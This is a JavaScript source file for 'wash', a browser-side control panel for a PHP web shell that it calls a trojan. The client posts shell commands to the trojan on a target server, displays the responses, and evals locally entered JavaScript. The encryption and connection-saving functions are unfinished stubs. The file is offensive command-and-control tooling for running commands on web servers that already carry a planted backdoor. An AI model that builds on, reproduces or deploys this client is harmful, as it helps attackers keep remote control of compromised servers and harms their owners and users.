// this is the top-level application object
var wash = {

    // store the version number (sometimes this is handy)
    version: '1.0.0',

    // object that encapsulates command-related functionality
    command: {

        // switch on wash actions
        action: '',

        // buffer the object that will be encrypted and sent to the trojan
        obj: new Command(),

        // encrypts a command before sending to the trojan
        encrypt: function(){
            return true;
        },

        // decrypts a command before sending to the trojan
        decrypt: function(){
            return true;
        },

        // processes commands on the wash prompt
        process: function(command){
            // parse out the wash action
            if(shell.prompt.mode.get() == 'wash'){
                // process wash commands as pure JavaScript. This allows for
                // some tremendous extensibility
                try{
                    eval(command);
                }catch(e){
                    wash.response.obj.prompt_context = shell.prompt.context.get();
                    wash.response.obj.output         = 'wash error: Invalid command.'
                    //shell.prompt.context.set(wash.response.obj.prompt_context);
                    shell.output.write(wash.response.obj.output , 'wash_error');
                }
            }
            
            // if the prompt is not in wash mode, default to shell action
            else {
                wash.command.obj.action = 'shell';
                wash.command.obj.cmd    = command;
                wash.command.encrypt();
                wash.command.send();
            }
        },

        // sends a command to the trojan
        send: function(){
            // make the AJAX request to the trojan
            $.ajax({
                type : wash.connection.request_type,
                url  : wash.connection.protocol + '://' + wash.connection.url,
                data : wash.command.obj,
            }).done(function(response){
                wash.response.obj = JSON.parse(response);
                // this has to go here rather than in command.process because
                // it is a callback that will be processed asynchronously
                wash.response.display();
            });
        }
    },

    // manage connections
    connection: {
        
        // @todo: I'm hard-coding these while debugging
        protocol     : 'http',
        url          : 'wash/trojans/plaintext/trojan.php',
        port         : '80',
        password     : '',
        request_type : 'post',

        // loads a saved connection
        load: function(){
            console.log('TODO: implement this.');
        },

        // saves a connection
        save: function(){
            console.log('TODO: implement this.');
        },

        // saves a connection under a new name
        saveas: function(){
            console.log('TODO: implement this.');
        },

        // updates a connection parameter
        set: function(parameter, value){
            wash.connection[parameter] = value;
            shell.status.set('wash.connection.' + parameter + ' has been set to ' + value + '.');
        },
    },

    response: {
        // this is a buffer for the response from the trojan
        obj: new Response(),

        // displays response data to the wash interface
        display: function(output_class){
            //decrypt here
            shell.prompt.context.set(wash.response.obj.prompt_context);
            shell.output.write(wash.response.obj.output , 'output ' + output_class);
        },
    },
}
